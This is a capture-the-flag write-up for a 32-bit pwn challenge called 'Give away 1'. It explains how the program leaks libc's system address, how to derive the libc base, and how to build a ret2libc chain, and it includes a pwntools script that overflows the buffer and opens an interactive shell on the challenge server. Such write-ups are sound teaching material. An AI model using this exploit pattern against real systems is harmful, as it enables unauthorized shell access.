# Give away 1

It gives us some sort of address, but what address? it Begins with `0xf7`, so likely an address in libc. We can step through in pwndbg and find that it's actually printing the address of system in libc. Since the challenge gives us their libc version, we can calcualate the libc base given the address of system and therefore the address of `/bin/sh`.

This means we can make the program go to the address of system, with `/bin/sh` as an argument(arguments are stored on the stack, just after the return address in 32-bit)

So, our exploit must:
* Collect system address
* Calculate libc version and address of `/bin/sh`
* Use this to call `system("/bin/sh")`

```python
from pwn import *
import re
NUM_TO_RET = 0x20 + 4
padding = b'A' * NUM_TO_RET
e = ELF("./give1")
libc = ELF("/lib32/libc.so.6" if sys.argv[1] == "local" else "libc-2.27.so")
#p = e.process()
p = remote('sharkyctf.xyz', 20334)
output = p.recvline().decode()
system = int(re.findall("Give away: (.*)", output)[0], 16)
libcbase = system - libc.symbols['system']
libc.address = libcbase
chain = flat(system, libc.symbols['exit'], next(libc.search(b"/bin/sh\x00")))
payload = padding + chain
p.sendline(payload)
p.interactive()
```
